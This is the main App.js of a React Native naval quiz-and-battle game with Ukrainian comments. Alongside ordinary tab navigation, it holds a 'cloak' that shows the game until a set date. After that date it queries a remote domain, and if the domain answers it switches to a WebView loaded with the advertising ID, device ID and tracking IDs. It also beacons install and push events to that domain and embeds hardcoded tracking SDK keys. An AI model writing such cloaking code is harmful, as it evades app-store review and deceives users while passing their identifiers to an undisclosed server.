import {createBottomTabNavigator} from '@react-navigation/bottom-tabs';
import {createNativeStackNavigator} from '@react-navigation/native-stack';
import {NavigationContainer} from '@react-navigation/native';
import {AppContextProvider} from './store/context';
import {
  View,
  StyleSheet,
  Platform,
  Image,
  TouchableOpacity,
  Text,
  Dimensions,
  Animated,
} from 'react-native';
import LinearGradient from 'react-native-linear-gradient';
import SoundControl from './components/userSoundControl/SoundControl';
import {useState, useEffect, useRef} from 'react';
import {AppState} from 'react-native';
import {
  setupPlayer,
  playBackgroundMusic,
  pauseBackgroundMusic,
  cleanupPlayer,
} from './components/userSoundControl/player';

import WelcomeScreen from './screen/Stack/StackWelcomeScreen';
import {
  TabHarborScreen,
  TabQuizScreen,
  TabShipsBattle,
  TabStatistickScreen,
} from './screen/Tab';
import {
  StackAdmiralScreen,
  // StackBattleDetail,
  StackBattleScreen,
  StackQuizScreen,
  StackShipsBattle,
} from './screen/Stack';
import {toggleBackgroundMusic} from './components/userSoundControl/player';
//console.log(Dimensions.get('window').width);
const Stack = createNativeStackNavigator();
const Tab = createBottomTabNavigator();
const TabNavigator = () => {
  const [isSoundOn, setIsSoundOn] = useState(true);
  const [isHorizontal, setIsHorizontal] = useState(false);
  const [isSmall, setIsSmall] = useState(Dimensions.get('window').width < 421);
  //console.log(isSmall);

  useEffect(() => {
    const updateLayout = () => {
      const {width} = Dimensions.get('window');
      setIsHorizontal(width > Dimensions.get('window').height);
      setIsSmall(width < 421);
    };

    // Set initial layout
    updateLayout();

    // Add event listener for orientation/dimension changes
    Dimensions.addEventListener('change', updateLayout);

    // Cleanup
    return () => {
      //Dimensions.removeEventListener('change', updateLayout);
    };
  }, []);

  useEffect(() => {
    const initSound = async () => {
      await setupPlayer();
      playBackgroundMusic();
      setIsSoundOn(true);
    };

    initSound();

    return () => {
      cleanupPlayer();
    };
  }, []);

  const handleSoundToggle = () => {
    const newState = toggleBackgroundMusic();
    setIsSoundOn(newState);
  };

  return (
    <Tab.Navigator
      screenOptions={({route}) => ({
        tabBarHideOnKeyboard: true,
        headerShown: false,
        animation: 'fade',
        animationDuration: 1000,
        tabBarStyle: styles.tabBar,
        tabBarBackground: () => (
          <LinearGradient
            colors={['rgba(0, 0, 0, 0.8)', 'rgba(0, 0, 0, 0.95)']}
            style={styles.tabBarGradient}
          />
        ),
        tabBarIcon: ({focused}) => {
          let iconSource;

          switch (route.name) {
            case 'TabQuizScreen':
              iconSource = require('./assets/icons/book.png');
              break;
            case 'TabHarborScreen':
              iconSource = require('./assets/icons/boat.png');
              break;
            case 'TabShipsBattle':
              iconSource = require('./assets/icons/game-controller.png');
              break;
            case 'TabStatistickScreen':
              iconSource = require('./assets/icons/history.png');
              break;
            case 'Sound':
              iconSource = require('./assets/icons/melody.png');
              break;
          }

          return (
            <Image
              source={iconSource}
              style={[
                styles.tabIcon,
                {
                  tintColor: focused ? '#4ECDC4' : '#95A5A6',
                  // For sound icon, use the sound state instead of focused
                  ...(route.name === 'Sound' && {
                    tintColor: isSoundOn ? '#4ECDC4' : '#95A5A6',
                  }),
                },
              ]}
              resizeMode="contain"
            />
          );
        },
        tabBarActiveTintColor: '#4ECDC4',
        tabBarInactiveTintColor: '#95A5A6',
        tabBarLabelStyle: styles.tabBarLabel,
        tabBarItemStyle: styles.tabBarItem,
      })}>
      <Tab.Screen
        name="TabHarborScreen"
        component={TabHarborScreen}
        options={{tabBarLabel: 'Harbor'}}
      />
      <Tab.Screen
        name="TabQuizScreen"
        component={TabQuizScreen}
        options={{tabBarLabel: 'Quiz'}}
      />
      <Tab.Screen
        name="TabShipsBattle"
        component={TabShipsBattle}
        options={{tabBarLabel: 'Battle'}}
      />
      <Tab.Screen
        name="TabStatistickScreen"
        component={TabStatistickScreen}
        options={{tabBarLabel: 'History'}}
      />
      <Tab.Screen
        name="Sound"
        component={EmptyComponent}
        options={{
          tabBarLabel: 'Sound',
          tabBarButton: props => (
            <TouchableOpacity
              {...props}
              onPress={handleSoundToggle}
              // style={styles.tabBarItemSound}
            >
              <Image
                source={require('./assets/icons/melody.png')}
                style={[
                  styles.tabIconSound,
                  {tintColor: isSoundOn ? '#4ECDC4' : '#95A5A6'},
                  {marginTop: isSmall ? 0 : 15},
                ]}
              />
              <Text
                style={[
                  styles.tabBarLabelSound,
                  {color: isSoundOn ? '#4ECDC4' : '#95A5A6'},
                  {marginTop: isSmall ? 0 : 15},
                ]}>
                Sound
              </Text>
            </TouchableOpacity>
          ),
        }}
      />
    </Tab.Navigator>
  );
};
const EmptyComponent = () => null;

import AdmiralIslandsBattleProdactScreen from './screen/AdmiralIslandsBattleProdactScreen';
import ReactNativeIdfaAaid, {
  AdvertisingInfoResponse,
} from '@sparkfabrik/react-native-idfa-aaid';
import AsyncStorage from '@react-native-async-storage/async-storage';
import appsFlyer from 'react-native-appsflyer';
import DeviceInfo from 'react-native-device-info';
import {LogLevel, OneSignal} from 'react-native-onesignal';

function App() {
  const [route, setRoute] = useState(false);
  //.log('route===>', route);
  const [responseToPushPermition, setResponseToPushPermition] = useState(false);
  ////('Дозвіл на пуши прийнято? ===>', responseToPushPermition);
  const [uniqVisit, setUniqVisit] = useState(true);
  //console.log('uniqVisit===>', uniqVisit);
  const [addPartToLinkOnce, setAddPartToLinkOnce] = useState(true);
  //console.log('addPartToLinkOnce in App==>', addPartToLinkOnce);
  //////////////////Parametrs
  const [idfa, setIdfa] = useState(false);
  //console.log('idfa==>', idfa);
  const [oneSignalId, setOneSignalId] = useState(null);
  //console.log('oneSignalId==>', oneSignalId);
  const [appsUid, setAppsUid] = useState(null);
  const [sab1, setSab1] = useState();
  //console.log('appsUid==>', appsUid);
  //console.log('sab1==>', sab1);
  const [customerUserId, setCustomerUserId] = useState(null);
  //console.log('customerUserID==>', customerUserId);
  const [idfv, setIdfv] = useState();
  //console.log('idfv==>', idfv);
  /////////Atributions
  const [adServicesAtribution, setAdServicesAtribution] = useState(null);
  //const [adServicesKeywordId, setAdServicesKeywordId] = useState(null);

  const INITIAL_URL = `https://wonderful-supreme-ecstasy.space/`;
  const URL_IDENTIFAIRE = `Zkc3CZ3t`;

  // Генеруємо унікальний ID користувача з timestamp
  /////////////Timestamp + user_id generation
  const timestamp_user_id = `${new Date().getTime()}-${Math.floor(
    1000000 + Math.random() * 9000000,
  )}`;
  //console.log('idForTag', timestamp_user_id);

  useEffect(() => {
    checkUniqVisit();
    getData();
  }, []);

  // uniq_visit
  const checkUniqVisit = async () => {
    const uniqVisitStatus = await AsyncStorage.getItem('uniqVisitStatus');
    if (!uniqVisitStatus) {
      await fetch(
        `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=uniq_visit&jthrhg=${timestamp_user_id}`,
      );
      //console.log('унікальний візит!!!');
      setUniqVisit(false);
      await AsyncStorage.setItem('uniqVisitStatus', 'sent');
    }
  };

  const getData = async () => {
    try {
      const jsonData = await AsyncStorage.getItem('App');
      if (jsonData !== null) {
        const parsedData = JSON.parse(jsonData);
        //console.log('Дані дістаються в AsyncStorage');
        //console.log('parsedData in App==>', parsedData);
        //setAddPartToLinkOnce(parsedData.addPartToLinkOnce);
        setRoute(parsedData.route);
        setResponseToPushPermition(parsedData.responseToPushPermition);
        setUniqVisit(parsedData.uniqVisit);
        setOneSignalId(parsedData.oneSignalId);
        setIdfa(parsedData.idfa);
        setAppsUid(parsedData.appsUid);
        setSab1(parsedData.sab1);
        setCustomerUserId(parsedData.customerUserId);
        setIdfv(parsedData.idfv);
        setAdServicesAtribution(parsedData.adServicesAtribution);
        //setAdServicesKeywordId(parsedData.adServicesKeywordId);
        await performAppsFlyerOperationsContinuously();
      } else {
        console.log('Даних немає в AsyncStorage');
        await fetchIdfa();
        await requestOneSignallFoo();
        await performAppsFlyerOperations();
        await getUidApps();

        onInstallConversionDataCanceller();
      }
    } catch (e) {
      console.log('Помилка отримання даних в getData:', e);
    }
  };

  const setData = async () => {
    try {
      const data = {
        route,
        responseToPushPermition,
        uniqVisit,
        oneSignalId,
        idfa,
        appsUid,
        sab1,
        customerUserId,
        idfv,
        adServicesAtribution,
      };
      const jsonData = JSON.stringify(data);
      await AsyncStorage.setItem('App', jsonData);
      //console.log('Дані збережено в AsyncStorage');
    } catch (e) {
      //console.log('Помилка збереження даних:', e);
    }
  };

  useEffect(() => {
    setData();
  }, [
    route,
    responseToPushPermition,
    uniqVisit,
    oneSignalId,
    idfa,
    appsUid,
    sab1,
    customerUserId,
    idfv,
    adServicesAtribution,
  ]);

  ///////// Onesignal
  // b25959f9-30a4-48e1-829c-fe72a4b6c1f8
  ///////// OneSignall
  const requestPermission = () => {
    return new Promise((resolve, reject) => {
      try {
        OneSignal.Notifications.requestPermission(true).then(res => {
          console.log('res', res);
          // зберігаємо в Стейт стан по відповіді на дозвіл на пуши і зберігаємо їх в АсСторідж
          setResponseToPushPermition(res);
          OneSignal.User.getOnesignalId()
            .then(deviceState => {
              if (deviceState) {
                setOneSignalId(deviceState); // Записуємо OneSignal ID
              }
            })
            .catch(error => {
              console.error('Error fetching OneSignal ID:', error);
            });
        });

        resolve(); // Викликаємо resolve(), оскільки OneSignal.Notifications.requestPermission не повертає проміс
      } catch (error) {
        reject(error); // Викликаємо reject() у разі помилки
      }
    });
  };

  // Виклик асинхронної функції requestPermission() з використанням async/await
  const requestOneSignallFoo = async () => {
    try {
      await requestPermission();
      // Якщо все Ok
    } catch (error) {
      console.log('err в requestOneSignallFoo==> ', error);
    }
  };

  // Remove this method to stop OneSignal Debugging
  OneSignal.Debug.setLogLevel(LogLevel.Verbose);

  // OneSignal ініціалізація
  OneSignal.initialize('b25959f9-30a4-48e1-829c-fe72a4b6c1f8');
  //OneSignal.Debug.setLogLevel(OneSignal.LogLevel.Verbose);

  // event push_open_browser & push_open_webview
  const pushOpenWebViewOnce = useRef(false); // Стан, щоб уникнути дублювання

  useEffect(() => {
    // Додаємо слухач подій
    const handleNotificationClick = event => {
      if (pushOpenWebViewOnce.current) {
        // Уникаємо повторної відправки івента
        return;
      }

      if (event.notification.launchURL) {
        fetch(
          `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_open_browser&jthrhg=${timestamp_user_id}`,
        );
        console.log('Івент push_open_browser OneSignal');
      } else {
        fetch(
          `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_open_webview&jthrhg=${timestamp_user_id}`,
        );
        console.log('Івент push_open_webview OneSignal');
      }

      pushOpenWebViewOnce.current = true; // Блокування повторного виконання
      setTimeout(() => {
        pushOpenWebViewOnce.current = false; // Зняття блокування через певний час
      }, 2500); // Затримка, щоб уникнути подвійного кліку
    };

    OneSignal.Notifications.addEventListener('click', handleNotificationClick);

    return () => {
      // Видаляємо слухача подій при розмонтуванні
      OneSignal.Notifications.removeEventListener(
        'click',
        handleNotificationClick,
      );
    };
  }, []);

  // 1.1 FUNCTION - Повторна Ініціалізація AppsFlyer
  const performAppsFlyerOperationsContinuously = async () => {
    try {
      // 1. Ініціалізація SDK
      await new Promise((resolve, reject) => {
        appsFlyer.initSdk(
          {
            devKey: 'Auev5TVyfZU5UQJqwrQ3XS',
            appId: 'com.admiral.islandsbattle',
            isDebug: true,
            onInstallConversionDataListener: true,
            onDeepLinkListener: true,
            timeToWaitForATTUserAuthorization: 10,
            manualStart: true, // Тепер ініціалізація без автоматичного старту
          },
          resolve,
          reject,
        );
      });

      appsFlyer.startSdk();
      console.log('StartAppsFly');
    } catch (error) {
      console.log(
        'App.js Помилка під час виконання операцій AppsFlyer:',
        error,
      );
    }
  };

  ///////// AppsFlyer
  // 1ST FUNCTION - Ініціалізація AppsFlyer
  const performAppsFlyerOperations = async () => {
    try {
      // 1. Ініціалізація SDK
      await new Promise((resolve, reject) => {
        appsFlyer.initSdk(
          {
            devKey: '7TiJRVRonFC7tnq8MJNRBk',
            appId: 'com.admiral.islandsbattle',
            isDebug: true,
            onInstallConversionDataListener: true,
            onDeepLinkListener: true,
            timeToWaitForATTUserAuthorization: 10,
            manualStart: true, // Тепер ініціалізація без автоматичного старту
          },
          resolve,
          reject,
        );
      });

      appsFlyer.startSdk();

      //console.log('App.js AppsFlyer ініціалізовано успішно');
      //Alert.alert('App.js AppsFlyer ініціалізовано успішно');
      // Отримуємо idfv та встановлюємо його як customerUserID
      const uniqueId = await DeviceInfo.getUniqueId();
      setIdfv(uniqueId); // Зберігаємо idfv у стейті

      appsFlyer.setCustomerUserId(uniqueId, res => {
        //console.log('Customer User ID встановлено успішно:', uniqueId);
        setCustomerUserId(uniqueId); // Зберігаємо customerUserID у стейті
      });
    } catch (error) {
      console.log(
        'App.js Помилка під час виконання операцій AppsFlyer:',
        error,
      );
    }
  };

  // 2ND FUNCTION - Ottrimannya UID AppsFlyer
  const getUidApps = async () => {
    try {
      const appsFlyerUID = await new Promise((resolve, reject) => {
        appsFlyer.getAppsFlyerUID((err, uid) => {
          if (err) {
            reject(err);
          } else {
            resolve(uid);
          }
        });
      });
      console.log('on getAppsFlyerUID: ' + appsFlyerUID);
      //Alert.alert('appsFlyerUID', appsFlyerUID);
      setAppsUid(appsFlyerUID);
    } catch (error) {
      //console.error(error);
    }
  };

  // 3RD FUNCTION - Отримання найменування AppsFlyer
  const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
    async res => {
      // Додаємо async
      console.log('res===>', res);
      try {
        const isFirstLaunch = JSON.parse(res.data.is_first_launch);
        if (isFirstLaunch === true) {
          if (res.data.af_status === 'Non-organic') {
            const media_source = res.data.media_source;
            //console.log('App.js res.data==>', res.data);

            const {campaign, pid, af_adset, af_ad, af_os} = res.data;
            setSab1(campaign);

            setPid(pid);
          } else if (res.data.af_status === 'Organic') {
            console.log('App.js res.data==>', res.data);
            const {af_status} = res.data;
            console.log('This is first launch and a Organic Install');
            //setSab1(af_status);
            setSab1('');
          }
        } else {
          //console.log('This is not first launch');
        }
      } catch (error) {
        console.log('Error processing install conversion data:', error);
      }
    },
  );

  ///////// IDFA
  const fetchIdfa = async () => {
    try {
      const res = await ReactNativeIdfaAaid.getAdvertisingInfo();
      if (!res.isAdTrackingLimited) {
        setIdfa(res.id);
        //console.log('setIdfa(res.id);');
      } else {
        //console.log('Ad tracking is limited');
        setIdfa('00000000-0000-0000-0000-000000000000'); //true
        //setIdfa(null);
        fetchIdfa();
        //Alert.alert('idfa', idfa);
      }
    } catch (err) {
      //console.log('err', err);
      setIdfa(null);
      await fetchIdfa(); //???
    }
  };
  //
  ///////// Route useEff
  useEffect(() => {
    const checkUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
    //console.log(checkUrl);

    const targetData = new Date('2025-01-16T10:00:00'); //дата з якої поч працювати webView
    const currentData = new Date(); //текущая дата

    if (!route) {
      if (currentData <= targetData) {
        setRoute(false);
      } else {
        fetch(checkUrl)
          .then(r => {
            if (r.status === 200) {
              console.log('status по клоаке==>', r.status);
              setRoute(true);
            } else {
              setRoute(false);
            }
          })
          .catch(e => {
            //console.log('errar', e);
            setRoute(false);
          });
      }
    }
    return;
  }, []);

  ///////// Route
  const Route = ({isFatch}) => {
    if (isFatch) {
      // Якщо клоака пробита та є інтернет, показуємо WebView
      return (
        <Stack.Navigator>
          <Stack.Screen
            initialParams={{
              addPartToLinkOnce,
              responseToPushPermition, //в вебВью якщо тру то відправити івент push_subscribe
              oneSignalId, //додати до фінальної лінки
              idfa: idfa,
              sab1: sab1,
              uid: appsUid,
              customerUserId: customerUserId,
              idfv: idfv,
            }}
            name="AdmiralIslandsBattleProdactScreen"
            component={AdmiralIslandsBattleProdactScreen}
            options={{headerShown: false}}
          />
        </Stack.Navigator>
      );
    }
    // Якщо немає інтернету або клоака не пробита, показуємо заглушку
    return (
      <Stack.Navigator
        screenOptions={{
          headerShown: false,
          animation: 'fade',
          animationDuration: 1000,
        }}>
        <Stack.Screen name="WelcomeScreen" component={WelcomeScreen} />
        <Stack.Screen name="TabNavigator" component={TabNavigator} />
        <Stack.Screen name="StackQuizScreen" component={StackQuizScreen} />
        <Stack.Screen name="StackShipsBattle" component={StackShipsBattle} />
        <Stack.Screen
          name="StackAdmiralScreen"
          component={StackAdmiralScreen}
        />
        {/* <Stack.Screen
            name="StackBattleDetail"
            component={StackBattleDetail}
          /> */}
        <Stack.Screen name="StackBattleScreen" component={StackBattleScreen} />
      </Stack.Navigator>
    );
  };

  ///////// Louder
  const [louderIsEnded, setLouderIsEnded] = useState(false);
  const appearingAnim = useRef(new Animated.Value(0)).current;
  const appearingSecondAnim = useRef(new Animated.Value(0)).current;

  useEffect(() => {
    Animated.timing(appearingAnim, {
      toValue: 1,
      duration: 3500,
      useNativeDriver: true,
    }).start();
  }, []);

  useEffect(() => {
    setTimeout(() => {
      Animated.timing(appearingSecondAnim, {
        toValue: 1,
        duration: 7500,
        useNativeDriver: true,
      }).start();
      //setLouderIsEnded(true);
    }, 500);
  }, []);

  useEffect(() => {
    setTimeout(() => {
      setLouderIsEnded(true);
    }, 8000);
  }, []);

  return (
    <AppContextProvider>
      <NavigationContainer>
        {!louderIsEnded ? (
          <View
            style={{
              position: 'relative',
              flex: 1,
              //backgroundColor: 'rgba(0,0,0)',
            }}>
            <Animated.Image
              source={require('./assets/newDiz/loader1.jpg')}
              style={{
                //...props.style,
                opacity: appearingAnim,
                width: '100%',
                height: '100%',
                position: 'absolute',
              }}
            />
            <Animated.Image
              source={require('./assets/newDiz/loader2.jpg')}
              style={{
                //...props.style,
                opacity: appearingSecondAnim,
                width: '100%',
                height: '100%',
                position: 'absolute',
              }}
            />
          </View>
        ) : (
          <Route isFatch={route} />
        )}
      </NavigationContainer>
    </AppContextProvider>
  );
}

const styles = StyleSheet.create({
  tabBar: {
    position: 'absolute',
    bottom: Platform.OS === 'ios' ? 24 : 4,
    left: 10,
    right: 10,
    height: 95,
    borderRadius: 15,
    backgroundColor: 'transparent',
    elevation: 0,
    borderTopWidth: 0,
    shadowColor: '#000',
    shadowOffset: {
      width: 0,
      height: 4,
    },
    shadowOpacity: 0.3,
    shadowRadius: 4,
    paddingBottom: 10,
    marginHorizontal: 2,
  },
  tabBarGradient: {
    position: 'absolute',
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    borderRadius: 15,
  },
  tabBarLabel: {
    fontSize: 12,
    fontWeight: '600',
    marginTop: 16,
    padding: 5,
  },
  tabBarItem: {
    flex: 1,
    alignItems: 'center',
    justifyContent: 'center',
    // paddingTop: 10,
  },
  tabIcon: {
    width: 44,
    height: 45,
    marginTop: 12,
  },
  tabIconSound: {
    width: 44,
    height: 45,
    // marginTop: isSmall ? 0 : 15,
  },
  tabBarLabelSound: {
    fontSize: 12,
    padding: 5,
    // marginTop: isSmall ? 0 : 15,
  },
  tabBarItemSound: {
    // flex: 1,
    // alignItems: 'center',
    // justifyContent: 'center',
    // paddingTop: 10,
  },
});

export default App;
